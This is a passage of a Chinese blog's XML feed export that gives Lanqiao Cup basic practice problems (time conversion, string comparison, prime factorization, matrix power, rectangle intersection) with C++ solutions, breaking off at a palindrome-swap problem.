top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="-19"><a href="#-19" class="headerlink" title=""></a></h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="-20"><a href="#-20" class="headerlink" title=""></a></h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="-21"><a href="#-21" class="headerlink" title=""></a></h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>]]></content>
      
      
      <categories>
          
          <category> Programma </category>
          
          <category> lanqiaobei </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Programma </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蓝桥杯 基础练习 vip试题</title>
      <link href="2020/09/27/Programme/lanqiaobei/Basic-Algorithm/Basic-Algorithm-vip/"/>
      <url>2020/09/27/Programme/lanqiaobei/Basic-Algorithm/Basic-Algorithm-vip/</url>
      
        <content type="html"><![CDATA[<div class="note warning simple"><p>Warning [BASIC-27] 待做</p></div><h1 id="BASIC-14-VIP试题-时间转换"><a href="#BASIC-14-VIP试题-时间转换" class="headerlink" title="BASIC-14    VIP试题 时间转换"></a>BASIC-14    VIP试题 时间转换</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><ol><li>资源限制<br> 时间限制：1.0s   内存限制：512.0MB</li><li>问题描述<br>　　给定一个以秒为单位的时间t，要求用“&lt;H&gt;:&lt;M&gt;:&lt;S&gt;”的格式来表示这个时间。&lt;H&gt;表示时间，&lt;M&gt;表示分钟，而&lt;S&gt;表示秒，它们都是整数且没有前导的“0”。例如，若t=0，则应输出是“0:0:0”；若t=3661，则输出“1:1:1”。</li><li>输入格式<br>　　输入只有一行，是一个整数t（0&lt;=t&lt;=86399）。</li><li>输出格式<br>　　输出只有一行，是以“&lt;H&gt;:&lt;M&gt;:&lt;S&gt;”的格式所表示的时间，不包括引号。</li><li>样例输入<br> 0</li><li>样例输出<br> 0:0:0</li><li>样例输入<br> 5436</li><li>样例输出<br> 1:30:36</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> sec;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; sec;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; sec/<span class="number">3600</span> &lt;&lt; <span class="string">&quot;:&quot;</span>;</span><br><span class="line">sec = sec%<span class="number">3600</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; sec/<span class="number">60</span> &lt;&lt; <span class="string">&quot;:&quot;</span>;</span><br><span class="line">sec = sec%<span class="number">60</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; sec;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="BASIC-15-VIP试题-字符串对比"><a href="#BASIC-15-VIP试题-字符串对比" class="headerlink" title="BASIC-15    VIP试题 字符串对比"></a>BASIC-15    VIP试题 字符串对比</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><ol><li>资源限制<br> 时间限制：1.0s   内存限制：512.0MB</li><li>问题描述<br>　　给定两个仅由大写字母或小写字母组成的字符串(长度介于1到10之间)，它们之间的关系是以下4中情况之一：<br>　　    1、两个字符串长度不等。比如 Beijing 和 Hebei<br>　　    2、两个字符串不仅长度相等，而且相应位置上的字符完全一致(区分大小写)，比如 Beijing 和 Beijing<br>　　    3、两个字符串长度相等，相应位置上的字符仅在不区分大小写的前提下才能达到完全一致（也就是说，它并不满足情况2）。比如 beijing 和 BEIjing<br>　　    4、两个字符串长度相等，但是即使是不区分大小写也不能使这两个字符串一致。比如 Beijing 和 Nanjing<br>　　编程判断输入的两个字符串之间的关系属于这四类中的哪一类，给出所属的类的编号。</li><li>输入格式<br>　　包括两行，每行都是一个字符串</li><li>输出格式<br>　　仅有一个数字，表明这两个字符串的关系编号</li><li>样例输入<br> BEIjing<br> beiJing </li><li>样例输出<br> 3</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">string</span> arr, brr;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; arr &gt;&gt; brr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(arr.length()!=brr.length())</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(arr==brr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">transform(arr.begin(), arr.end(), arr.begin(), ::<span class="built_in">toupper</span>);</span><br><span class="line">transform(brr.begin(), brr.end(), brr.begin(), ::<span class="built_in">toupper</span>);</span><br><span class="line"><span class="keyword">if</span>(arr==brr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&#x27;3&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&#x27;4&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="BASIC-16-VIP试题-分解质因数"><a href="#BASIC-16-VIP试题-分解质因数" class="headerlink" title="BASIC-16    VIP试题 分解质因数"></a>BASIC-16    VIP试题 分解质因数</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><ol><li>资源限制<br> 时间限制：1.0s   内存限制：512.0MB</li><li>问题描述<br>　　求出区间[a,b]中所有整数的质因数分解。</li><li>输入格式<br>　　输入两个整数a，b。</li><li>输出格式<br>　　每行输出一个数的分解，形如k=a1<em>a2</em>a3…(a1&lt;=a2&lt;=a3…，k也是从小到大的)(具体可看样例)</li><li>样例输入<br> 3 10</li><li>样例输出<br> 3=3<br> 4=2<em>2<br> 5=5<br> 6=2</em>3<br> 7=7<br> 8=2<em>2</em>2<br> 9=3<em>3<br> 10=2</em>5<br> 提示<br> 　　先筛出所有素数，然后再分解。</li><li>数据规模和约定<br>　　2&lt;=a&lt;=b&lt;=10000</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a, b;</span><br><span class="line">    <span class="keyword">int</span> arr[<span class="number">10005</span>] = &#123;<span class="number">2</span>&#125;, num = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; a &gt;&gt; b;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>; i &lt;= b; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">bool</span> a1 = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; num; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>( i%arr[j] )</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                a1 = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;     </span><br><span class="line">            &#125;      </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(a1)</span><br><span class="line">            arr[num++] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = a; i &lt;= b; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; i &lt;&lt;<span class="string">&quot;=&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span> x = i;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; num;)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>( x%arr[j] == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(x/arr[j]==<span class="number">1</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">cout</span> &lt;&lt; arr[j] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;   </span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">cout</span> &lt;&lt; arr[j] &lt;&lt; <span class="string">&quot;*&quot;</span>;</span><br><span class="line">                    x = x/arr[j];</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                j++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="BASIC-17-VIP试题-矩阵乘法"><a href="#BASIC-17-VIP试题-矩阵乘法" class="headerlink" title="BASIC-17    VIP试题 矩阵乘法"></a>BASIC-17    VIP试题 矩阵乘法</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><ol><li>资源限制<br> 时间限制：1.0s   内存限制：512.0MB</li><li>问题描述<br>　　给定一个N阶矩阵A，输出A的M次幂（M是非负整数）<br>　　例如：<br>　　A =<br>　　1 2<br>　　3 4<br>　　A的2次幂<br>　　7 10<br>　　15 22</li><li>输入格式<br>　　第一行是一个正整数N、M（1&lt;=N&lt;=30, 0&lt;=M&lt;=5），表示矩阵A的阶数和要求的幂数<br>　　接下来N行，每行N个绝对值不超过10的非负整数，描述矩阵A的值</li><li>输出格式<br>　　输出共N行，每行N个整数，表示A的M次幂所对应的矩阵。相邻的数之间用一个空格隔开</li><li>样例输入<br> 2 2<br> 1 2<br> 3 4</li><li>样例输出<br> 7 10<br> 15 22</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> arr[<span class="number">32</span>][<span class="number">32</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> brr[<span class="number">32</span>][<span class="number">32</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> crr[<span class="number">32</span>][<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">int</span> n, m, num=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; m;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(m == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span>  i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(i == j)</span><br><span class="line">                    <span class="built_in">cout</span> &lt;&lt; <span class="number">1</span> &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">                <span class="keyword">else</span> </span><br><span class="line">                    <span class="built_in">cout</span> &lt;&lt; <span class="number">0</span> &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span>  i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; arr[i][j];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            brr[i][j] = arr[i][j];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(num &lt; m)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                crr[i][j] = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; n; k++)</span><br><span class="line">                &#123;</span><br><span class="line">                    crr[i][j] += arr[i][k] * brr[k][j];</span><br><span class="line">                &#125;</span><br><span class="line">    </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        num++;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                brr[i][j] = crr[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; brr[i][j] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="BASIC-18-VIP试题-矩形面积交"><a href="#BASIC-18-VIP试题-矩形面积交" class="headerlink" title="BASIC-18    VIP试题 矩形面积交"></a>BASIC-18    VIP试题 矩形面积交</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><ol><li>资源限制<br> 时间限制：1.0s   内存限制：512.0MB</li><li>问题描述<br>　　平面上有两个矩形，它们的边平行于直角坐标系的X轴或Y轴。对于每个矩形，我们给出它的一对相对顶点的坐标，请你编程算出两个矩形的交的面积。</li><li>输入格式<br>　　输入仅包含两行，每行描述一个矩形。<br>　　在每行中，给出矩形的一对相对顶点的坐标，每个点的坐标都用两个绝对值不超过10^7的实数表示。</li><li>输出格式<br>　　输出仅包含一个实数，为交的面积，保留到小数后两位。</li><li>样例输入<br> 1 1 3 3<br> 2 2 4 4</li><li>样例输出<br> 1.00</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">double</span> x1, y1, x2, y2;</span><br><span class="line"><span class="keyword">double</span> x3, y3, x4, y4;</span><br><span class="line"><span class="keyword">double</span> m1, m2, n1, n2;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; x1 &gt;&gt; y1 &gt;&gt; x2 &gt;&gt; y2 &gt;&gt; x3 &gt;&gt; y3 &gt;&gt; x4 &gt;&gt; y4;</span><br><span class="line">m1 = min(max(x1,x2), max(x3,x4));</span><br><span class="line">n1 = min(max(y1,y2), max(y3,y4));</span><br><span class="line">m2 = max(min(x1,x2), min(x3,x4));</span><br><span class="line">n2 = max(min(y1,y2), min(y3,y4));</span><br><span class="line"><span class="keyword">if</span>(m1&gt;m2 &amp;&amp; n1&gt;n2)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; setiosflags(ios::fixed) &lt;&lt; setprecision(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; (m1-m2)*(n1-n2) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;0.00&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="BASIC-19-VIP试题-完美的代价"><a href="#BASIC-19-VIP试题-完美的代价" class="headerlink" title="BASIC-19    VIP试题 完美的代价"></a>BASIC-19    VIP试题 完美的代价</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><ol><li>资源限制<br> 时间限制：1.0s   内存限制：512.0MB</li><li>问题描述<br>　　回文串，是一种特殊的字符串，它从左往右读和从右往左读是一样的。小龙龙认为回文串才是完美的。现在给你一个串，它不一定是回文的，请你计算最少的交换次数使得该串变成一个完美的回文串。<br>　　交换的定义是：交换两个相邻的字符<br>　　例如mamad<br>　　第一次交换 ad : mamda<br>　　第二次交换 md : madma<br>　　第三次交换 ma : madam (回文！完美！)</li><li>输入格式<br>　　第一行是一个整数N，表示接下来的字符串的长度(N &lt;= 8000)<br>　　第二行是一个字符串，长度为N.只包含小写字母</li><li>输出格式<br>　　如果可能，输出最少的交换次数。<br>　　否则输出Impossible</li><li>样例输入<br> 5<br> mamad</li><li>样例输出<br> 3</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 